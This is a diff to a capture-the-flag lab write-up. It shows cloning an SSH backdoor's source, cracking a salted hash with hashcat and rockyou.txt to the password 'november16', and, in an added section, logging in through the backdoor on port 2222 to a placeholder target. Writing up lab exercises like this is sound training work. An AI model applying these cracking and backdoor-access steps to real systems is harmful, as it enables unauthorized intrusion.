@@ -47,7 +47,7 @@ secret12         (bee)
 
 ### 2 - Research - Analyse the code
 
-Getting the source code from Github
+Getting the source code from GitHub
 ```
 $ git clone https://github.com/NinjaJc01/ssh-backdoor
 ```
@@ -88,6 +88,23 @@ $ hashcat -m 1710 hash rockyou.txt
 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16
 <...snip...>
 ```
+
+### Attack - Get back in!
+
+![image](https://github.com/elomarii/CTF_4_DAY/assets/106914699/7dd6543d-9ca4-4fe1-b17b-f707bcec99aa)
+
+To get back control over the server, we'll connect to SSH port 2222 with the found password.
+```
+$ ssh james@<target_ip> -p 2222 -oHostKeyAlgorithms=+ssh-rsa
+<...snip...>
+
+james@overpass-production:/home/james/ssh-backdoor$ cd ~
+
+james@overpass-production:/home/james$ ls
+ssh-backdoor  user.txt  www
+
+```
+
 
 
 
